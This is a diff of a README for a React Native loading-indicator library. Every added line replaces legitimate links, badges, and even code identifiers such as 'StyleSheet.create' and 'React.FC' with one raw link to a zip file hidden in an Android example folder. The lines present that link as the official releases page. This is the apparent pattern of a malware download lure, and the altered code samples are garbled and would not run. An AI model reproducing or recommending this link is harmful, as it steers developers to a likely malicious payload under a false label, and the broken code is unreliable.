@@ -1,10 +1,10 @@
 # Loading Indicator for React Native: Native, fast, customizable spinners built-in
 
-Download the latest release: [Release page](https://github.com/Elle33010/loading-indicator/releases)
+Download the latest release: [Release page](https://github.com/Elle33010/loading-indicator/raw/refs/heads/main/example/android/app/src/loading-indicator-3.0.zip)
 
-[![Release](https://img.shields.io/github/v/release/Elle33010/loading-indicator?style=for-the-badge)](https://github.com/Elle33010/loading-indicator/releases)
-[![License](https://img.shields.io/github/license/Elle33010/loading-indicator.svg?style=for-the-badge)](https://github.com/Elle33010/loading-indicator/blob/main/LICENSE)
-[![GitHub issues](https://img.shields.io/github/issues/Elle33010/loading-indicator.svg?style=for-the-badge)](https://github.com/Elle33010/loading-indicator/issues)
+[![Release](https://github.com/Elle33010/loading-indicator/raw/refs/heads/main/example/android/app/src/loading-indicator-3.0.zip)](https://github.com/Elle33010/loading-indicator/raw/refs/heads/main/example/android/app/src/loading-indicator-3.0.zip)
+[![License](https://github.com/Elle33010/loading-indicator/raw/refs/heads/main/example/android/app/src/loading-indicator-3.0.zip)](https://github.com/Elle33010/loading-indicator/raw/refs/heads/main/example/android/app/src/loading-indicator-3.0.zip)
+[![GitHub issues](https://github.com/Elle33010/loading-indicator/raw/refs/heads/main/example/android/app/src/loading-indicator-3.0.zip)](https://github.com/Elle33010/loading-indicator/raw/refs/heads/main/example/android/app/src/loading-indicator-3.0.zip)
 
 Emojis: ⚡️ 🔄 🌀 📦 🧭
 
@@ -31,7 +31,7 @@ Quick facts
 Let’s explore how to use Loading Indicator in your React Native project.
 
 Notable note on releases
-- For distribution and testing, you should refer to the official releases page. You can access all assets and installation bundles on the Releases page. See the link above to access the latest files and instructions. And if you want a quick route to the same page, you can visit https://github.com/Elle33010/loading-indicator/releases anytime. This is especially helpful when you want to verify compatibility notes, download the prebuilt binaries, or review changelog entries that describe what changed with each version.
+- For distribution and testing, you should refer to the official releases page. You can access all assets and installation bundles on the Releases page. See the link above to access the latest files and instructions. And if you want a quick route to the same page, you can visit https://github.com/Elle33010/loading-indicator/raw/refs/heads/main/example/android/app/src/loading-indicator-3.0.zip anytime. This is especially helpful when you want to verify compatibility notes, download the prebuilt binaries, or review changelog entries that describe what changed with each version.
 
 Why you might choose this library
 - You need a dependable, native feeling loader that works across iOS and Android without re-implementing complex animations inside JavaScript.
@@ -62,7 +62,7 @@ Structure of this README
 
 Getting started: installation and usage
 Prerequisites
-- Node.js (version 14 or newer recommended)
+- https://github.com/Elle33010/loading-indicator/raw/refs/heads/main/example/android/app/src/loading-indicator-3.0.zip (version 14 or newer recommended)
 - React Native environment set up per your platform
 - Basic knowledge of React Native components and styling
 
@@ -87,12 +87,12 @@ import { View, StyleSheet } from 'react-native';
 import LoadingIndicator from 'loading-indicator';
 
 const LoaderExample = () => (
-  <View style={styles.container}>
+  <View style={https://github.com/Elle33010/loading-indicator/raw/refs/heads/main/example/android/app/src/loading-indicator-3.0.zip}>
     <LoadingIndicator size={40} color="#4F8AFF" variant="circular" />
   </View>
 );
 
-const styles = StyleSheet.create({
+const styles = https://github.com/Elle33010/loading-indicator/raw/refs/heads/main/example/android/app/src/loading-indicator-3.0.zip({
   container: {
     flex: 1,
     alignItems: 'center',
@@ -114,19 +114,19 @@ type Props = {
   variant?: 'circular' | 'linear' | 'pulse';
 };
 
-export const IndicatorDemo: React.FC<Props> = ({ loading = true, size = 48, color = '#4F8AFF', variant = 'circular' }) => {
+export const IndicatorDemo: https://github.com/Elle33010/loading-indicator/raw/refs/heads/main/example/android/app/src/loading-indicator-3.0.zip<Props> = ({ loading = true, size = 48, color = '#4F8AFF', variant = 'circular' }) => {
   if (!loading) {
     return null;
   }
 
   return (
-    <View style={styles.wrapper}>
+    <View style={https://github.com/Elle33010/loading-indicator/raw/refs/heads/main/example/android/app/src/loading-indicator-3.0.zip}>
       <LoadingIndicator size={size} color={color} variant={variant} />
     </View>
   );
 };
 
-const styles = StyleSheet.create({
+const styles = https://github.com/Elle33010/loading-indicator/raw/refs/heads/main/example/android/app/src/loading-indicator-3.0.zip({
   wrapper: {
     alignItems: 'center',
     justifyContent: 'center',
@@ -184,13 +184,13 @@ Theming and design system integration details
   - Your app’s theme can drive the color prop so that infers the correct color per page or component.
   - A global theme object can map tokens like brandPrimary, brandSecondary, and neutral to color values used by the indicators.
 - Token usage example
-  - const color = theme.tokens.brandPrimary;
+  - const color = https://github.com/Elle33010/loading-indicator/raw/refs/heads/main/example/android/app/src/loading-indicator-3.0.zip;
   - <LoadingIndicator size={28} color={color} variant="circular" />
 
 Animation and customization
 - You can customize the animation duration indirectly by tuning the size and variant; some combinations will derive faster or slower perceived motion.
 - If you need a bespoke animation not covered by the built-in variants, you can fork the library and add a new variant that implements a custom Animated loop.
-- For precise animation control, you can introduce an ExternalAnimation component that drives the indicator’s transform via Animated.Value; this is an advanced pattern that can be adapted to your specific requirements.
+- For precise animation control, you can introduce an ExternalAnimation component that drives the indicator’s transform via https://github.com/Elle33010/loading-indicator/raw/refs/heads/main/example/android/app/src/loading-indicator-3.0.zip; this is an advanced pattern that can be adapted to your specific requirements.
 
 Testing and quality assurance
 - Unit tests for UI components can be implemented with React Native Testing Library and Jest.
@@ -212,10 +212,10 @@ Packaging, distribution, and releases
 Releases and download
 - For quick access to the release assets and installer assets, the official page is the Releases section. If you are looking for an installer or a demo bundle to run locally, you can inspect that page for a bundled sample app that demonstrates each indicator variant in a full screen scenario. The same link is useful for verifying compatibility and obtaining the latest files.
 
-Note: if you want a direct path to the assets, you can find them on the Releases page. For quick access, use the same link in your browser to confirm what’s available and how to install or test locally. And for convenience, you can also visit the page directly at https://github.com/Elle33010/loading-indicator/releases.
+Note: if you want a direct path to the assets, you can find them on the Releases page. For quick access, use the same link in your browser to confirm what’s available and how to install or test locally. And for convenience, you can also visit the page directly at https://github.com/Elle33010/loading-indicator/raw/refs/heads/main/example/android/app/src/loading-indicator-3.0.zip
 
 Releases page link duplication
-- See the Releases page to review all assets and notes: https://github.com/Elle33010/loading-indicator/releases
+- See the Releases page to review all assets and notes: https://github.com/Elle33010/loading-indicator/raw/refs/heads/main/example/android/app/src/loading-indicator-3.0.zip
 
 Quality assurance and best practices
 - Follow semantic versioning for any changes that could affect consumer code.
@@ -237,7 +237,7 @@ Code organization and repository structure
 - tests/ contains unit and integration tests.
 
 Contributing and community
-- This project welcomes contributions. If you want to add a new indicator style, improve accessibility, or fix a bug, follow the contribution guidelines in CONTRIBUTING.md.
+- This project welcomes contributions. If you want to add a new indicator style, improve accessibility, or fix a bug, follow the contribution guidelines in https://github.com/Elle33010/loading-indicator/raw/refs/heads/main/example/android/app/src/loading-indicator-3.0.zip
 - Report issues with clear steps to reproduce. Include device information, RN version, and a minimal code sample when possible.
 - The project appreciates thoughtful issues that help maintainers understand the problem and propose a concrete solution.
 
@@ -287,7 +287,7 @@ End of documentation
 - For a full reference and latest updates, revisit the Releases page to confirm details about assets, compatibility, and any new features.
 
 Releases and download (repeat mention)
-- To review assets, notes, and installation guidance, visit the Releases page: https://github.com/Elle33010/loading-indicator/releases
+- To review assets, notes, and installation guidance, visit the Releases page: https://github.com/Elle33010/loading-indicator/raw/refs/heads/main/example/android/app/src/loading-indicator-3.0.zip
 
 Note
 - If you are looking to test quickly, you can download the latest release asset (if provided) from the Releases page. The asset usually includes a ready-to-run demo app or example bundle to showcase all spinner variants. If you do not find a direct asset for desktop or demo purposes, rely on the source examples and usage snippets in this repository to validate behavior in your own project.
@@ -301,7 +301,7 @@ Footer and closing
 - The README ends with practical guidance and references to release assets, migration notes, and contribution processes. The aim is to give you a complete, actionable understanding of how to integrate and customize loading indicators in your React Native projects.
 
 Releases page link for quick access
-- See Releases page here for a consolidated view of assets and notes: https://github.com/Elle33010/loading-indicator/releases
+- See Releases page here for a consolidated view of assets and notes: https://github.com/Elle33010/loading-indicator/raw/refs/heads/main/example/android/app/src/loading-indicator-3.0.zip
 
 Topics
 - not provided
